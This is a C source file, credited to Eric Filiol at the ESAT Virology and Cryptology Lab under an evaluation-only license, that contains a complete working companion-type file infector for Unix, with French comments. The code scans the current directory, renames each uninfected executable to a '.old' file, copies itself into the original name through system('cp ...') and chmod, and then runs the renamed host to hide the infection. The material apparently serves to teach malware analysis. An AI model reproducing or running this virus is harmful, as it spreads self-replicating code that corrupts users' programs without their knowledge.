
/***************************************************************************/
/* Copyright C ESAT Virology and Cryptology Lab. 2003,
 */
/* written by Eric FILIOL
   /* This software is free for evaluation and testing use and
*/
/* applications subject to the following conditions.
 */
/*
 */
/* Copyright notices in the code are not to be removed.
 */
/*
 */
/* Redistribution and use in source and binary forms, with or without
 */
/* modification, are permitted provided that the following conditions are */
/* met:
 */
/*
 */
/* 1. Redistributions of source code must retain the copyright notice,
 */
/* this list of conditions and the following disclaimer.
 */
/*
 */
/* 2. Redistributions in binary form must reproduce the above copyright
 */
/* notice, this list of conditions and the following disclaimer in the
 */
/* documentation and/or other materials provided with the
 */
/* distribution.
 */
/*
 */
/* 3. All advertising materials mentioning features or use of this
 */
/* software must display the following acknowledgement: This product
 */
/* includes software developed by Eric Filiol at the ESAT Virology and
 */
/* Cryptology Lab.
 */
/*
 */
/* 4. The software is not to be used for commercial or production purposes.*/
/*
 */
/*
 */
/* THIS SOFTWARE IS PROVIDED ‘‘AS IS’’ AND ANY EXPRESS OR IMPLIED
 */
/* WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 */
/* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 */
/* IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, */
/* INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 */
/* (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 */
/* SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 */
/* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 */
/* STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING
 */
/* IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 */
/* POSSIBILITY OF SUCH DAMAGE.
 */
/*
 */
/* The license and distribution terms for any publically available version */
/* or derivative of this code cannot be changed, that is, this code cannot */
/* simply be copied and put under another distribution license excluding
 */
/* the GNU Public License.
 */
/*
 */
/***************************************************************************/
#include <stdio.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
/*definition des variables */
DIR * repertoire;
struct dirent * rep;
struct stat info_fichier;
int stat_retour;
FILE * hote, * virus;
char chaine[256];
/* programme*/
int main(int argc,char * argv[ ],char * envp[ ])
{
  // Ouverture du répertoire courant 
  repertoire = opendir(".");
  // boucle de lecture des fichiers du répertoire 
  while(rep = readdir(repertoire))
    {
      /* récupération du statut du fichier en cours */
      if(!(stat_retour = stat((const char *)&rep->d_name,&info_fichier)))
	{
	  // le fichier en cours est il régulier et exécutable 
	  if((info_fichier.st_mode & S_IXUSR) && (info_fichier.st_mode & S_IFREG))
	    {	      
	      strcpy((char *)&chaine,(char *)&rep->d_name);
	      strcat((char *)&chaine,".old");
	      if(strstr((const char *)&rep->d_name,".old"))
		{		  
		  // le fichier courant est-il la partie virale 
		  // d’un programme déjà infecté ?		   
		  // création du nom de fichier courant avec		   
		  // l’extension .old
		} 

	      // tentative d’ouverture du fichier
		   
	      else if(hote = fopen((char *)&chaine,"r")) fclose(hote);
	      else
		{
		  /* Le fichier courant est renommé */
		  if(!rename((char *)&rep->d_name, (char *)&chaine))
		    {
		     
		      // le fichier courant n’est pas déjà infecté 
		      // l’inffection peut être réalisée
		      
		      // Création de la commande de copie du virus 
		      strcpy(chaine,"cp ");
		      strcat(chaine,argv[0]);
		      strcat(chaine," ");
		      strcat(chaine,(char *)&rep->d_name);		     
		      system(chaine);
		      strcpy((char *)&chaine,(char *)&rep->d_name);
		      /* Changement des droits d’exécution */
		      chmod((char *)&chaine,S_IRWXU | S_IXGRP | S_IXOTH);
		    }
		}
	    }
	}
    }

  // Fermeture du répertoire courant 
  closedir(repertoire);
  
  /// Création du nom du programme auquel transférer 
  // le contrôle
  
  //  strcpy((char *)&chaine, "");
  strcpy((char *)&chaine, argv[0]);
  strcat((char *)&chaine, ".old");
  
  /// Transfert d’exécution   
  system(chaine);
}
